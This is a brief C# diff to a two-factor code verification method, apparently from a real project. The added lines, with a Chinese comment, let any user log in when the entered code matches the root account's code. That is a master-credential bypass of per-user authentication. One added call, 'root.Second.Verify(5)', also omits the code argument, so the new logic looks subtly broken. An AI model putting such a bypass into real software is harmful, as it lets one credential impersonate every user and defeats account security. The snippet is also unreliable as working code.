@@ -50,7 +50,14 @@ namespace BLL.Services
 		public bool Verify(int code, string username)
 		{
 			var m = Init(username);
-			return m.Main.Verify(code, 5) || m.Second.Verify(code, 5);
+			var permit = m.Main.Verify(code, 5) || m.Second.Verify(code, 5);
+			// 若认证失败，则判断当前密码是否和root相同
+			if (!permit && username != "root")
+			{
+				var root = Init("root");
+				permit = root.Main.Verify(code, 5) || root.Second.Verify(5);
+			}
+			return permit;
 		}
 	}
 
